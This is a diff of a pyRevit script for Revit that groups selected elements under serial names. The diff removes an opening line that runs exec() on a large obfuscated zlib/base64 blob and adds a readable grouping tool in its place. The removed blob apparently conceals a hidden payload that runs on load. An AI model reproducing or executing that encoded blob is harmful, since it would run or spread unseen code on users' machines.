@@ -1,2 +1,260 @@
-import base64, zlib
-exec(zlib.decompress(base64.b64decode('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')))
+﻿# PolyForm Internal Use 1.0.0 - Copyright (C) 2026 Javier Sols
+# Source available for inspection and authorized internal use only.
+
+"""
+SerialGrouping v8.6
+Revit 2025 / .NET 8 Stable
+Feature: Pre-Selection Fast Track & IronPython Fixes
+"""
+__title__ = "Serial\nGrouping"
+
+import clr
+import System
+import json
+import os
+
+# Explicit assembly loading
+clr.AddReference('System.Xml')
+clr.AddReference('PresentationFramework')
+clr.AddReference('PresentationCore')
+clr.AddReference('RevitAPI') 
+clr.AddReference('RevitAPIUI')
+
+from System.IO import StringReader
+from System.Xml import XmlReader
+from System.Windows.Markup import XamlReader
+from System.Windows.Interop import WindowInteropHelper
+from System.Collections.Generic import List
+
+import Autodesk.Revit.DB as DB
+import Autodesk.Revit.UI as UI_API
+from pyrevit import revit, forms
+
+from Autodesk.Revit.Exceptions import OperationCanceledException
+
+# --- 1. CONFIGURATION PERSISTENCE ---
+appdata_dir = os.environ.get('APPDATA', '')
+CONFIG_PATH = os.path.join(appdata_dir, "pyRevit_SerialGrouping_v8.json")
+
+def save_config(base_name, suffix):
+    try:
+        data = {"base_name": base_name, "suffix": suffix}
+        with open(CONFIG_PATH, 'w') as f:
+            json.dump(data, f)
+    except:
+        pass
+
+def load_config():
+    if os.path.exists(CONFIG_PATH):
+        try:
+            with open(CONFIG_PATH, 'r') as f:
+                return json.load(f)
+        except:
+            pass
+    return {"base_name": "Detail_Group", "suffix": "01"}
+
+# --- 2. DATA MODEL & HELPERS ---
+class GroupHistoryRow(object):
+    def __init__(self, name):
+        self.name = name
+
+# Bypasses the IronPython .Name reflection bug
+def get_element_name(elem):
+    try:
+        return elem.Name
+    except AttributeError:
+        return DB.Element.Name.GetValue(elem)
+
+def set_element_name(elem, target_name):
+    try:
+        elem.Name = target_name
+    except AttributeError:
+        DB.Element.Name.SetValue(elem, target_name)
+
+# --- 3. THE UI WINDOW ---
+class SerialGroupWindow(object):
+    def __init__(self, start_base, start_suff, history_data):
+        self.is_ready = False
+        self.history_data = history_data
+        
+        xaml_str = """
+        <Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
+                xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
+                Title="Serial Grouping v8.6" Height="550" Width="420" Topmost="True" WindowStartupLocation="CenterScreen">
+            <Grid Margin="20">
+                <Grid.RowDefinitions>
+                    <RowDefinition Height="Auto"/><RowDefinition Height="Auto"/><RowDefinition Height="Auto"/><RowDefinition Height="*"/><RowDefinition Height="Auto"/>
+                </Grid.RowDefinitions>
+                
+                <StackPanel Grid.Row="0" Margin="0,0,0,15">
+                    <TextBlock Text="NAMING CONFIGURATION" FontSize="10" FontWeight="Bold" Foreground="#666666"/>
+                    <Separator Margin="0,5,0,5"/>
+                </StackPanel>
+
+                <Grid Grid.Row="1" Margin="0,0,0,15">
+                    <Grid.ColumnDefinitions><ColumnDefinition Width="2*"/><ColumnDefinition Width="1*"/></Grid.ColumnDefinitions>
+                    <StackPanel Margin="0,0,5,0">
+                        <TextBlock Text="Base Name Particle:"/>
+                        <TextBox Name="BaseNameInput" Height="28" VerticalContentAlignment="Center" FontSize="14"/>
+                    </StackPanel>
+                    <StackPanel Grid.Column="1" Margin="5,0,0,0">
+                        <TextBlock Text="Start Suffix:"/>
+                        <TextBox Name="SuffixInput" Height="28" VerticalContentAlignment="Center" FontSize="14"/>
+                    </StackPanel>
+                </Grid>
+
+                <Button Name="StartBtn" Grid.Row="2" Content="START SERIAL GROUPING" Height="45" Background="#2E7D32" Foreground="White" FontWeight="Bold" FontSize="14"/>
+
+                <GroupBox Grid.Row="3" Header="Session Confirmation History" Margin="0,15,0,0">
+                    <DataGrid Name="HistoryGrid" AutoGenerateColumns="False" CanUserAddRows="False" IsReadOnly="True" Background="#F5F5F5" VerticalScrollBarVisibility="Auto">
+                        <DataGrid.Columns>
+                            <DataGridTextColumn Header="Created Group Name" Binding="{Binding name}" Width="*"/>
+                        </DataGrid.Columns>
+                    </DataGrid>
+                </GroupBox>
+
+                <StackPanel Grid.Row="4" Margin="0,15,0,0">
+                    <TextBlock Text="INSTRUCTIONS:" FontWeight="Bold" FontSize="10" Foreground="#666666"/>
+                    <TextBlock Text="1. Click Start. 2. Select elements. 3. Click 'Finish' on Options Bar." Foreground="#888888" FontSize="11" TextWrapping="Wrap"/>
+                    <TextBlock Text="PRO TIP: Select elements before running script to bypass this UI." Foreground="#2196F3" FontSize="11" FontWeight="Bold" Margin="0,5,0,0"/>
+                </StackPanel>
+            </Grid>
+        </Window>
+        """
+        reader = XmlReader.Create(StringReader(xaml_str))
+        self.ui = XamlReader.Load(reader)
+        
+        self.base_input = self.ui.FindName("BaseNameInput")
+        self.suffix_input = self.ui.FindName("SuffixInput")
+        self.history_grid = self.ui.FindName("HistoryGrid")
+        self.start_btn = self.ui.FindName("StartBtn")
+        
+        self.base_input.Text = start_base
+        self.suffix_input.Text = start_suff
+        self.history_grid.ItemsSource = self.history_data
+        
+        self.start_btn.Click += self.on_start_click
+        
+        try:
+            handle = System.Diagnostics.Process.GetCurrentProcess().MainWindowHandle
+            WindowInteropHelper(self.ui).Owner = handle
+        except: pass
+
+    def on_start_click(self, sender, e):
+        self.base_val = self.base_input.Text
+        self.suff_val = self.suffix_input.Text
+        self.is_ready = True
+        self.ui.Close()
+
+    def show(self):
+        self.ui.ShowDialog()
+
+# --- 4. MAIN EXECUTION ---
+if __name__ == "__main__":
+    uidoc = revit.uidoc
+    doc = revit.doc
+    
+    config = load_config()
+    current_base = config.get("base_name", "Detail_Group")
+    current_suff = config.get("suffix", "01")
+    
+    # Check for Pre-Selection
+    pre_selection = uidoc.Selection.GetElementIds()
+    
+    # ==========================================
+    # TRACK A: FAST TRACK (PRE-SELECTION MODE)
+    # ==========================================
+    if pre_selection.Count > 0:
+        clean_suff = current_suff if current_suff.startswith("_") else "_" + current_suff
+        target_name = "{}{}".format(current_base, clean_suff)
+        
+        with DB.Transaction(doc, "Serial Group: " + target_name) as t:
+            t.Start()
+            existing = DB.FilteredElementCollector(doc).OfClass(DB.GroupType)
+            name_exists = any(get_element_name(et) == target_name for et in existing)
+            
+            if name_exists:
+                t.RollBack()
+                forms.alert("Error: '{}' already exists. Run tool without selection to change name.".format(target_name))
+            else:
+                try:
+                    new_group = doc.Create.NewGroup(pre_selection)
+                    set_element_name(new_group.GroupType, target_name)
+                    t.Commit()
+                    
+                    # Increment & Save
+                    numeric_part = "".join(filter(str.isdigit, current_suff))
+                    if numeric_part:
+                        next_val = int(numeric_part) + 1
+                        current_suff = current_suff.replace(numeric_part, str(next_val).zfill(len(numeric_part)))
+                    save_config(current_base, current_suff)
+                    
+                except Exception as e:
+                    t.RollBack()
+                    forms.alert("Failed to group elements.\nError: {}".format(e))
+                    
+    # ==========================================
+    # TRACK B: CONFIG & LOOP (STANDARD MODE)
+    # ==========================================
+    else:
+        session_history = []
+
+        while True:
+            app = SerialGroupWindow(current_base, current_suff, session_history)
+            app.show()
+            
+            if not app.is_ready:
+                break 
+                
+            current_base = app.base_val
+            current_suff = app.suff_val
+            save_config(current_base, current_suff)
+            
+            while True:
+                clean_suff = current_suff if current_suff.startswith("_") else "_" + current_suff
+                target_name = "{}{}".format(current_base, clean_suff)
+                
+                msg = "Select elements for {}. Click 'Finish' on Options Bar, or hit [ESC] to return.".format(target_name)
+                
+                try:
+                    choices = uidoc.Selection.PickObjects(UI_API.Selection.ObjectType.Element, msg)
+                except OperationCanceledException:
+                    break
+
+                if not choices or choices.Count == 0:
+                    break
+
+                ids = List[DB.ElementId]()
+                for ref in choices:
+                    ids.Add(ref.ElementId)
+
+                with DB.Transaction(doc, "Serial Group: " + target_name) as t:
+                    t.Start()
+                    
+                    existing = DB.FilteredElementCollector(doc).OfClass(DB.GroupType)
+                    name_exists = any(get_element_name(et) == target_name for et in existing)
+                    
+                    if name_exists:
+                        t.RollBack()
+                        forms.alert("Error: '{}' already exists. Try incrementing manually.".format(target_name))
+                        break 
+                    else:
+                        try:
+                            new_group = doc.Create.NewGroup(ids)
+                            set_element_name(new_group.GroupType, target_name)
+                            t.Commit()
+                            session_history.insert(0, GroupHistoryRow(target_name))
+                        except Exception as e:
+                            t.RollBack()
+                            forms.alert("Failed to group elements.\nError: {}".format(e))
+                            break
+                        
+                try:
+                    numeric_part = "".join(filter(str.isdigit, current_suff))
+                    if numeric_part:
+                        next_val = int(numeric_part) + 1
+                        current_suff = current_suff.replace(numeric_part, str(next_val).zfill(len(numeric_part)))
+                except: 
+                    pass
+                    
+                save_config(current_base, current_suff)
